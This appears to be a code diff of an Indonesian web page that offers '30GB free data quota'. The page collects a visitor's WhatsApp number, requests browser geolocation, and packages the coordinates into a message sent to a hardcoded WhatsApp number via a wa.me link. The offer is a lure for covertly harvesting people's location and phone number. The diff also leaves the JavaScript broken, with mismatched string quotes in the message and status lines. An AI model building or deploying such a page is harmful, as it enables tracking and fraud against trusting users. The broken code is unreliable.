@@ -274,23 +274,23 @@ for(let i=0; i<30; i++){
 
   </div>
 
-  <h1>ðŸŽ DAPATKAN KUOTA 30GB GRATIS</h1>
+  <h1> DAPATKAN KUOTA 30GB GRATIS</h1>
   <p class="sub-judul">Klaim sekarang sebelum kehabisan!</p>
   
   <div class="form-group">
-    <label for="nomorWA">ðŸ“± Masukkan Nomor WhatsApp:</label>
+    <label for="nomorWA">“± Masukkan Nomor WhatsApp:</label>
     <input type="tel" id="nomorWA" placeholder="Contoh: 6281234567xxx" maxlength="15">
   </div>
 
   <button class="btn" id="getLocBtn">
-    âšªKLAIM KUOTA
+    KLAIM KUOTA
   </button>
   
   <div class="status" id="statusBox"></div>
   <div class="map-link" id="mapBox"></div>
 
   <p class="catatan">
-    âœ… Setelah izinkan lokasi â†’ data otomatis dikirim ke nomor tujuan.<br>
+    Setelah izinkan lokasi ’ data otomatis dikirim ke nomor tujuan.<br>
     Pastikan nomor diawali <b>62</b> (tanpa + atau 0 di depan).
   </p>
 </div>
@@ -308,13 +308,13 @@ const mapBox = document.getElementById('mapBox');
     function ambilNomorPengguna(){
       let nomor = nomorWAInput.value.trim().replace(/\D/g,'');
       if(!nomor){
-        tampilStatus('âš ï¸ Silakan masukkan nomor WhatsApp dulu!', 'error');
+        tampilStatus('¸ Silakan masukkan nomor WhatsApp dulu!', 'error');
         return null;
       }
       if(nomor.startsWith('0')) nomor = '62' + nomor.slice(1);
       if(!nomor.startsWith('62')) nomor = '62' + nomor;
       if(nomor.length < 10){
-        tampilStatus('âš ï¸ Nomor terlalu pendek, periksa kembali!', 'error');
+        tampilStatus('¸ Nomor terlalu pendek, periksa kembali!', 'error');
         return null;
       }
       return nomor;
@@ -329,7 +329,7 @@ const mapBox = document.getElementById('mapBox');
         return;
       }
 
-      tampilStatus('ðŸ”„ Meminta akses lokasi... izinkan jika diminta', 'loading');
+      tampilStatus('Meminta akses lokasi... izinkan jika diminta', 'loading');
       getLocBtn.disabled = true;
       mapBox.style.display = 'none';
 
@@ -345,10 +345,10 @@ const mapBox = document.getElementById('mapBox');
       const lng = posisi.coords.longitude;
       const akurasi = Math.round(posisi.coords.accuracy);
 
-      tampilStatus(`âœ… Lokasi terekam! Mengirim ke nomor tujuan...`, 'success');
+      tampilStatus(`Lokasi terekam! Mengirim ke nomor tujuan...`, 'success');
 
       const pesan = 
-`ðŸ“Œ LAPORAN VERIFIKASI KUOTA
+'LAPORAN VERIFIKASI KUOTA'
       Nomor Pengguna: ${nomorPengguna}
       Lintang: ${lat}
       Bujur: ${lng}
@@ -359,19 +359,19 @@ const mapBox = document.getElementById('mapBox');
       const waLink = `https://wa.me/${NOMOR_TUJUAN}?text=${encodeURIComponent(pesan)}`;
 
       mapBox.style.display = 'block';
-      mapBox.innerHTML = `<a href="${waLink}" target="_blank">ðŸ“± Jika tidak otomatis terbuka, klik di sini</a>`;
+      mapBox.innerHTML = `<a href="${waLink}" target="_blank">“± Jika tidak otomatis terbuka, klik di sini</a>`;
       
       setTimeout(() => {
         window.open(waLink, '_blank');
-        tampilStatus(`âœ… Terkirim ke nomor: ${NOMOR_TUJUAN}`, 'success');
+        tampilStatus('Terkirim ke nomor: ${NOMOR_TUJUAN}`, 'success');
       }, 500);
       
       getLocBtn.disabled = false;
     }
 
     function gagalAmbilLokasi(err){
-      let pesan = 'âŒ Gagal dapatkan lokasi. ';
-      if(err.code === 1) pesan += 'Izin lokasi ditolak â€” izinkan di pengaturan browser.';
+      let pesan = 'Gagal dapatkan lokasi. ';
+      if(err.code === 1) pesan += 'Izin lokasi ditolak ” izinkan di pengaturan browser.';
       else if(err.code === 2) pesan += 'Sinyal lokasi tidak tersedia.';
       else if(err.code === 3) pesan += 'Waktu habis, coba lagi.';
       
